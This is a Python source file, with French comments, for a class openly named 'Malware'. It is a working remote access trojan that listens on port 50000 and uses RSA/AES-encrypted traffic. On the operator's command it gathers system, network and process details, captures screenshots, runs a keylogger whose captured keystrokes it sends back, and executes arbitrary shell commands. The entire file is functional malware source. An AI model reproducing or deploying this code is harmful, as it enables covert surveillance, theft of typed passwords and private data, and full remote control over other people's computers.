import psutil, getpass, pynput.keyboard, os, socket, subprocess as sp, platform, time, pyscreeze, base64, threading, logging, pkg_resources
from Crypto.Cipher import AES
from Crypto import Random
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_private_key

# CONSTANTES
ENCODING = 'UTF-8'
BUFFERSIZE = 2048
TIME_OUT = 3


class Malware():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn = self.s
        self.addr = self.s
        self.key_AES = ''
        self.os = ''
        self.KeyListener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)
        self.Key = pynput.keyboard.Key

    def connect(self):
        self.s.bind((self.ip, self.port))
        self.s.listen(5)
        self.conn, self.addr = self.s.accept()

    def disconnect(self):
        self.s.close()

    def load_key_private(self):
        with open("key_private_client.pem", 'rb') as pem_in: #Récupère la clé privée depuis le fichier
            pemlines = pem_in.read()
        privkey = load_pem_private_key(pemlines, None, backend=default_backend()) #
        return privkey

    def init_AES(self):
        private_key = self.load_key_private()

        cipher_Key = self.conn.recv(BUFFERSIZE)
        cipher_Key = base64.b64decode(cipher_Key)
        self.key_AES = private_key.decrypt(cipher_Key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                                algorithm=hashes.SHA256(),
                                                                label=None))

    def iv(self):
        return Random.new().read(AES.block_size)

    def do_encrypt(self, message):
        iv = self.iv()
        enc = AES.new(self.key_AES, AES.MODE_CFB, iv)
        cipherMessage = enc.encrypt(message)
        return iv + cipherMessage

    def do_decrypt(self, cipherMessage):
        enc = AES.new(self.key_AES, AES.MODE_CFB, cipherMessage[:16])
        message = enc.decrypt(cipherMessage[16:])
        return message.decode(ENCODING, errors='ignore')

    def task(self):

        act = self.conn.recv(BUFFERSIZE)
        act = self.do_decrypt(act)

        while act != 'exit()':
            if act == 'getinfo':
                self.give_informations_system()
            elif act == 'os':
                self.give_operating_system()
            elif act == 'cwd':
                self.give_current_working_directory()
            elif act[:2] == 'cd':
                self.change_current_directory(act)
            elif act == 'prtscr':
                self.give_print_screen()
            elif act == "keystart":
                self.keylogger("start")
            elif act == "keystop":
                self.keylogger("stop")
            elif act == "keydump":
                self.keylogger("dump")
            else:
                shell = Shell(self.conn, act, self.key_AES)
                shell.return_result_cmd()

            act = self.conn.recv(1024)
            act = self.do_decrypt(act)

    def give_informations_system(self):
        msg_info_global = '\n'
        # D'après la DOC, la constante de l'OS est à TRUE et les autres à false
        if psutil.WINDOWS:
            systemeExploitation = "WINDOWS"
        elif psutil.LINUX:
            systemeExploitation = "LINUX"
        elif psutil.MACOS:
            systemeExploitation = "MACOS"
        username = getpass.getuser()
        hostname = socket.gethostname()
        processId = os.getpid()  # récupération de l'identifiant du processus Malware

        # Informations globales OS + HOSTNAME + USERNAME + PROCESSID
        msg_info_global += (f'###################### INFORMATIONS GLOBALES ###################### \n'
                            f'OS \t\t\t\t : {systemeExploitation}\n'
                            f'Hostname \t\t : {hostname} \n'
                            f'Utilisateur \t : {username} \n'
                            f'ID processus \t : {processId} \n')

        # Informations sur les disques connectés à l'ordinateur

        listeDisque = psutil.disk_partitions()
        msg_info_global += (f'###################### INFORMATIONS DISQUES ###################### \n')
        for elem in listeDisque:
            msg_info_global += (f'Lettre du disque : {elem[0]} \n'
                                f'Point d\'encrage : {elem[1]} \n'
                                f'Format du disque : {elem[2]} \n'
                                f'options ?? : {elem[3]} \n\n')

        msg_info_reseau = '\n'

        # INFORMATIONS RESEAUX... TOUTES LES CONNEXIONS ACTUELLES A LA MACHINE
        # Fichier : infoReseaux.log
        msg_info_reseau += (f'###################### INFORMATIONS RESEAUX ######################\n')
        # kind : inet, inet4, inet6, tcp, tcp4,tcp6, udp,udp4,udp6, unix, all
        for elem2 in psutil.net_connections(kind='all'):
            # 3:0 = adresse locale  , 3:1 = port local
            # 4:0 = adresse distante, 4:1 = port distant
            # 5   = Status de la connexion
            # /!\ Il peut ne pas y avoir d'adresse distante, dans quel cas on affiche uniquement l'adresse/port local.
            # Sinon, le 4eme élement est vide et on se retrouve avec un out of index.


            if self.os == 'Windows':
                if not elem2[4]:
                    msg_info_reseau += (f'Adresse : {elem2[3][0]}:{elem2[3][1]} | {elem2[5]}\n')
                else:
                    msg_info_reseau += (
                        f'Adresse : {elem2[3][0]}:{elem2[3][1]} --> {elem2[4][0]}:{elem2[4][1]} | {elem2[5]}\n')
            else :
                msg_info_reseau = '\n'

        # INFORMATIONS PROCESSUS... LISTE TOUS LES PROCESSUS ACTIFS POUR LE MOMENT
        msg_info_process = '\n'
        msg_info_process += (f'###################### INFORMATIONS PROCESSUS ######################\n')
        for proc in psutil.process_iter(attrs=['name', 'username', 'pid']):
            for item in proc.info:
                msg_info_process += (item + ' : ' + str(proc.info[item]) + '\t')
            msg_info_process += ('\n')  # Rajout un passage à la ligne pour la forme

        msg_final = msg_info_global + msg_info_reseau + msg_info_process + "EOD"
        self.conn.send(self.do_encrypt(msg_final.encode(ENCODING)))

    def give_operating_system(self):
        self.os = platform.system()
        self.conn.send(self.do_encrypt(self.os.encode(ENCODING)))


    def give_current_working_directory(self):
        cwd = os.getcwd()
        if self.os == 'Linux':
            uid = os.getuid()
            if uid == 0:
                cwd = "root@ :" + cwd + "#"
            else:
                cwd = "user@ :" + cwd + "$"
        self.conn.send(self.do_encrypt(cwd.encode(ENCODING)))

    def change_current_directory(self, act):
        cd = act.strip('cd ')
        try:
            os.chdir(cd)
        except:
            print('Adresse Introuvable')

    def give_print_screen(self):
        if self.os == 'Linux':
            self.env = os.environ["HOME"]
        else:
            self.env = os.environ["TEMP"]
        pyscreeze.screenshot(self.env + "/s.png")
        # Envoi les informations du screenshot
        self.conn.send(self.do_encrypt(str.encode("Screenshot..." + "\n" + "Taille fichier: " + str(os.path.getsize(self.env + "/s.png"))
                                  + " bytes" + "\n" + "...")))
        objPic = open(self.env + "/s.png", "rb")
        time.sleep(1)
        self.conn.send(objPic.read())  # Envoi l'image
        objPic.close()

    def keylogger(self, option):
        global strKeyLogs

        if option == "start":
            if not self.KeyListener.running:
                self.KeyListener.start()
                self.conn.send(self.do_encrypt("succes".encode(ENCODING)))
            else:
                self.conn.send(self.do_encrypt("error".encode(ENCODING)))

        elif option == "stop":
            if self.KeyListener.running:
                self.KeyListener.stop()
                threading.Thread.__init__(self.KeyListener)  # re-initialise le thread
                strKeyLogs = ""
                self.conn.send(self.do_encrypt("succes".encode(ENCODING)))
            else:
                self.conn.send(self.do_encrypt("error".encode(ENCODING)))

        elif option == "dump":
            if not self.KeyListener.running:
                self.conn.send(self.do_encrypt("error".encode(ENCODING)))
            else:
                if strKeyLogs == "":
                    self.conn.send(self.do_encrypt("error2".encode(ENCODING)))
                else:
                    time.sleep(0.2)
                    self.conn.send(self.do_encrypt(str(len(strKeyLogs)).encode(ENCODING)))  # Envoi la taille
                    time.sleep(0.2)
                    self.conn.send(self.do_encrypt(strKeyLogs.encode(ENCODING)))  # Envoi les infos
                    strKeyLogs = ""  # clear logs

    def on_keyboard_event(self, event):
        global strKeyLogs

        try:  # check to see if variable is defined
            strKeyLogs
        except NameError:
            strKeyLogs = ""

        if event == self.Key.backspace:
            strKeyLogs += " [<-] "
        elif event == self.Key.tab:
            strKeyLogs += " [Tab] "
        elif event == self.Key.enter:
            strKeyLogs += "\n"
        elif event == self.Key.space:
            strKeyLogs += " "
        elif type(event) == self.Key:  # si c'est un autre caractère special
            strKeyLogs += " [" + str(event)[4:] + "] "
        else:
            strKeyLogs += str(event)[1:len(str(event)) - 1]  # enleve les guillemets

    def run(self):
        self.connect()
        self.init_AES()
        self.task()
        self.disconnect()


class Shell(Malware):

    def __init__(self, s, cmd, key):
        self.conn = s
        self.cmd = cmd
        self.key_AES = key

    def return_result_cmd(self):
        sh = sp.Popen(self.cmd, shell=True, stdout=sp.PIPE,
                      stderr=sp.PIPE, stdin=sp.PIPE,
                      universal_newlines=True)
        out, err = sh.communicate()
        result = (out) + (err)
        self.conn.sendall(self.do_encrypt(result.encode(ENCODING)))


# MAIN #
go = Malware('', 50000)
go.run()
